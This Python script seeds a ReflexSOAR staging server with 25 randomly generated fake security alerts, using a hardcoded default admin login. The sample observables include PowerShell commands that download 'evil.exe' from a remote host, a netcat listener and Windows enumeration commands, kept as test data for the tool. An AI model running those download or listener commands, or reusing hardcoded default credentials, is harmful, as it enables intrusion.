import json
import random
import datetime
import hashlib
import base64
import requests

host = 'https://staging.reflexsoar.com'

def auth():
    response = requests.post('{}/api/v1.0/auth/login'.format(host),
                             data=json.dumps({'username':'admin@reflexsoar.com', 'password':'reflex'}),
                             headers={'Content-Type': 'application/json'})
    if response.status_code == 200:
        token = response.json()['access_token']
        return token
    else:
        return None


def bulk(events):

    token = auth()
    if token:
        headers = {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer '+token
        }
        response = requests.post('{}/api/v1.0/event/_bulk'.format(host),
                                 data=json.dumps({"events": events}),
                                 headers=headers)
        if response.status_code == 200:
            print(response.json())
        else:
            print(response.content)
    else:
        return events
    
def reference():
    hasher = hashlib.md5()
    hasher.update(str(random.randint(0,1000)+datetime.datetime.utcnow().timestamp()).encode())
    return base64.b64encode(hasher.digest()).decode()


def case_templates():
  
  templates = [
    {"title":"Phishing Analysis","description":"Use this case template when investigating a Phishing e-mail.","tasks":[{"title":"Fetch original e-mail","description":"Get a copy of the original e-mail so that analysis can be performed on it to determine if it really is a phishing e-mail or not.","group_uuid":null,"owner_uuid":null,"order":"0"},{"title":"Notify users","description":"Send a phishing alert e-mail to all users so they are aware they may have been targeted.  This should buy time until the e-mail is scrubbed from the environment.","group_uuid":null,"owner_uuid":null,"order":"1"},{"title":"Quarantine","description":"Remove the original message from the e-mail environment","group_uuid":null,"owner_uuid":null,"order":"2"},{"title":"Post Mortem","description":"What have we learned from this event that could help in future events?","group_uuid":null,"owner_uuid":null,"order":"3"}],"tlp":2,"severity":2,"tags":["phishing"]}
  ]

def random_severity():
  return random.randint(0,3)

def random_host_name():
  names = [
    'thor',
    'sundial',
    'hunter',
    'bigrig',
    'bigbertha',
    'bfg4000',
    'brian-pc'
  ]

  return names[random.randint(0, len(names)-1)]

def random_username():
  users = [
    'brian',
    'joe',
    'jonathan',
    'dave',
    'molly',
    'stevie',
    'justin',
    'josh',
    'adam',
    'matthew',
    'administrator',
    'system'
  ]

  return users[random.randint(0, len(users)-1)]

def random_enumeration_command():
  commands = [
    'whoami /priv',
    'whoami /?',
    'hostname',
    'nc -lvp 5000',
    'nbtstat -rns',
  ]

  return commands[random.randint(0,len(commands)-1)]

def random_powershell_command():
  commands = [
    'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
    'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
    ''
  ]

  return commands[random.randint(0, len(commands)-1)]

def random_event():
  alerts = [
    {
      "title": "Host enumeration",
      "description": "Enumeration activity was detected on a machine in the network.  This could be indicitive of an attacker trying to determine what access they have",
      "reference": reference(),
      "tags": [
        "enumeration",
        "T1262"
      ],
      "tlp": 2,
      "severity": random_severity(),
      "observables": [
        {
          "value": random_host_name(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "host",
          "tags": [
            "source-host", "windows", "internal"
          ]
        },
        {
          "value": random_username(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "user",
          "tags": [
            "source-user", "corporate-user"
          ]
        },
        {
          "value": random_enumeration_command(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "command",
          "tags": [
            "command"
          ]
        }
      ],
      "raw_log": "something something dark side"
    },
    {
      "title": "Suspicious Powershell Command",
      "description": "A powershell command was run that fetches information from a remote host",
      "reference": reference(),
      "tags": [
        "enumeration",
        "T1059.001"
      ],
      "tlp": 2,
      "severity": random_severity(),
      "observables": [
        {
          "value": random_host_name(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "host",
          "tags": [
            "source-host", "windows", "internal"
          ]
        },
        {
          "value": random_username(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "user",
          "tags": [
            "source-user", "corporate-user"
          ]
        },
        {
          "value": random_powershell_command(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "command",
          "tags": [
            "command"
          ]
        }
      ],
      "raw_log": "something something dark side"},
    {
      "title": "IDS hit for malicious IP address",
      "description": "A host attempted to contact an IP address that is in a threat list as malicious",
      "reference": reference(),
      "tags": [
        "enumeration",
        "T1262"
      ],
      "tlp": 2,
      "severity": random_severity(),
      "observables": [
        {
          "value": random_host_name(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "host",
          "tags": [
            "source-host", "windows", "internal"
          ]
        },
        {
          "value": random_username(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "user",
          "tags": [
            "source-user", "corporate-user"
          ]
        },
        {
          "value": '208.67.222.222',
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "ip",
          "tags": [
            "destination-ip"
          ]
        }
      ],
      "raw_log": "something something dark side"
    },
    {
      "title": "User added to Local Administrators",
      "description": "A users privileges were escalated via addition to Local Administrators",
      "reference": reference(),
      "tags": [
        "enumeration",
        "T1262"
      ],
      "tlp": 2,
      "severity": random_severity(),
      "observables": [
        {
          "value": random_host_name(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "host",
          "tags": [
            "source-host", "windows", "internal"
          ]
        },
        {
          "value": random_username(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "dataType": "user",
          "tags": [
            "source-user", "corporate-user"
          ]
        }
      ],
      "raw_log": "something something dark side"
    }
  ]

  return alerts[random.randint(0, len(alerts)-1)]




events = []
for i in range(0,25):
    events.append(random_event())
print("Sending {} events...".format(len(events)))
bulk(events)